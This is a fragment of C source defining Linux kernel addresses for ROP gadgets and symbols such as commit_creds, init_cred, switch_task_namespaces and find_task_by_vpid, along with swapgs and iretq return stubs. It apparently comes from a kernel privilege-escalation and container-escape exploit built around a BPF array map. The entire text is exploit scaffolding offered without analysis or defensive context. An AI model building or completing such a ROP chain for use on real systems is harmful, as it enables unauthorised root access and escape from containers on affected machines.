#define ARRAY_MAP_OPS_OFF 0xffffffff82c42040
#define POP_RBX_RET 0xffffffff810dcb15 //pop rbx ; ret
#define POP_RDI_RET 0xffffffff8101cae1 //pop rdi ; ret
#define INIT_CRED 0xffffffff83c72d40
#define INIT_NSPROXY 0xffffffff83c72860
#define SWITCH_TASK_NAMESPACES 0xffffffff811fcbf0
#define COMMIT_CREDS 0xffffffff811feef0
#define FIND_TASK_BY_VPID 0xffffffff811f24c0
#define POP_RSI_RET 0xffffffff8115cb0e
#define LEAVE_RET 0xffffffff8207cad5
#define MOV_RDI_RAX_POP_RBX_RET 0xffffffff81fe3bbd // mov rdi, rax ; mov rax, rdi ; pop rbx ; ret
#define SWAGPGS_RET 0xffffffff82471836
#define IRETQ 0xffffffff8260123e
